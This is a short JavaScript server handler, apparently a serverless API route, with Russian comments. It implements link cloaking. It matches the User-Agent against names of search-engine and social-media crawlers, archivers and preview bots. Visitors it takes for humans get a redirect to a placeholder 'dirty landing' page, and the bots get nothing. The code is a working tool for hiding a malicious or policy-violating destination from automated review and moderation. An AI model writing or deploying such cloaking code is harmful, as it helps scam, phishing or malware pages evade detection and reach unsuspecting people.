export default async function handler(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';

    // Здесь твоя логика проверки
    const isBot = /(google|facebook|twitter|bing|bot|crawler|spider|archive|search|preview)/i.test(userAgent);

    if (!isBot) {
      // Человек: вернуть грязную ссылку
      return res.status(200).json({ redirect: 'https://your-dirty-landing.com' });
    } else {
      // Бот: ничего не отдавать
      return res.status(200).json({ redirect: null });
    }
  } catch (error) {
    return res.status(500).json({ error: 'Server error' });
  }
}
